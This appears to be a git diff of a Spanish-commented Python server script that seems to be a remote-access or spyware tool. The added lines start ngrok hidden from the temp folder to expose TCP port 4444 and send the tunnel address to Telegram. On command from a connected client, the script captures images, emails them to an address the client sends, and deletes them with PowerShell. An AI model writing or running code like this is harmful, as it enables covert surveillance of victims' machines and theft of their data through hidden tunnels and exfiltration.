@@ -4,16 +4,21 @@ import pyautogui
 import subprocess
 import threading
 import options
-import signal
+import signal, time
 import sys
 from rich import print
-import multiprocessing
+from comand import ngrok_send_Telegram
 
-# Kill Session Server with Powershell command
+# Start Process ngrok
+run = subprocess.run("powershell Start-Process $env:tmp\/ngrok 'tcp 4444' -WindowStyle Hidden")
+time.sleep(4)
+# Send Telegram ip and port
+response = ngrok_send_Telegram()
+print (response)
 
 #Get-Process | Select-Object Id,ProcessName | findstr Taskmgr
 def def_handler(sig, frame):
-    print("[!]  Saliendo....\n\n")
+    print("[red][!][/red]  [yellow italic]Saliendo....[/yellow italic]\n\n")
     sys.exit(1)
 
 signal.signal(signal.SIGINT, def_handler)
@@ -55,24 +60,24 @@ def mouse_move(letter_option):
 #283 814		1539 766
 
 # Servidor
-print ("[red]######################[/red][yellow]~~[/yellow]Inciado el Servidor[yellow]~~[/yellow][green]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@[/green]")
-print ('''[cyan]
-                            _ ___                /^^\ /^\  /^^\_
-            _          _@)@) \            ,,/ '` ~ `'~~ ', `\.
-        _/o\_ _ _ _/~`.`...'~\        ./~~..,'`','',.,' '  ~:
-        / `,'.~,~.~  .   , . , ~|,   ,/ .,' , ,. .. ,,.   `,  ~\_
-        ( ' _' _ '_` _  '  .    , `\_/ .' ..' '  `  `   `..  `,   \_
-        ~V~ V~ V~ V~ ~\ `   ' .  '    , ' .,.,''`.,.''`.,.``. ',   \_
-        _/\ /\ /\ /\_/, . ' ,   `_/~\_ .' .,. ,, , _/~\_ `. `. '.,  \_
-        < ~ ~ '~`'~'`, .,  .   `_: ::: \_ '      `_/ ::: \_ `.,' . ',  \_
-        \ ' `_  '`_    _    ',/ _::_::_ \ _    _/ _::_::_ \   `.,'.,`., \-,-,-,_,_,
-        `'~~ `'~~ `'~~ `'~~  \(_)(_)(_)/  `~~' \(_)(_)(_)/ ~'`\_.._,._,'_;_;_;_;_;
-[/cyan]''')
+#print ("[red]######################[/red][yellow]~~[/yellow]Inciado el Servidor[yellow]~~[/yellow][green]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@[/green]")
+#print ('''[cyan]
+#                            _ ___                /^^\ /^\  /^^\_
+#            _          _@)@) \            ,,/ '` ~ `'~~ ', `\.
+#        _/o\_ _ _ _/~`.`...'~\        ./~~..,'`','',.,' '  ~:
+#        / `,'.~,~.~  .   , . , ~|,   ,/ .,' , ,. .. ,,.   `,  ~\_
+#        ( ' _' _ '_` _  '  .    , `\_/ .' ..' '  `  `   `..  `,   \_
+#        ~V~ V~ V~ V~ ~\ `   ' .  '    , ' .,.,''`.,.''`.,.``. ',   \_
+#        _/\ /\ /\ /\_/, . ' ,   `_/~\_ .' .,. ,, , _/~\_ `. `. '.,  \_
+#        < ~ ~ '~`'~'`, .,  .   `_: ::: \_ '      `_/ ::: \_ `.,' . ',  \_
+#        \ ' `_  '`_    _    ',/ _::_::_ \ _    _/ _::_::_ \   `.,'.,`., \-,-,-,_,_,
+#        `'~~ `'~~ `'~~ `'~~  \(_)(_)(_)/  `~~' \(_)(_)(_)/ ~'`\_.._,._,'_;_;_;_;_;
+#[/cyan]''')
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, 4444))
         s.listen(3)
         conexion, addr = s.accept()
-        conexion.sendall(b'################~~~Conectado con El Servidor~~~##################')
+        conexion.sendall(b'###~~~Connect to Server~~~###')
         print ("\n[red][!][/red][yellow]Conexion Realizada con el Cliente[/yellow]\n\n")
         while True:
             #data = input("~# ")
@@ -81,12 +86,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             data_client = conexion.recv(1024).decode("utf-8")
             if data_client == "1":
                 data = conexion.recv(1024).decode("utf-8")
+                print(data)
                 if data == "ihere":
                     conexion.send(b'ihere')
                     pass
                 elif data == "continue":
                     image_name = conexion.recv(1024).decode("utf-8")
+                    print (image_name)
                     email = conexion.recv(1024).decode("utf-8")
+                    print (email)
+                    print ("Data Recived:\n==> {}\n==> {}".format(image_name, email))
                     path_image = option.capture_image(image_name)
                     option.send_image(path_image, email)
                     remove_image = subprocess.run("powershell rm -Path {} -Force".format(path_image), shell=True)
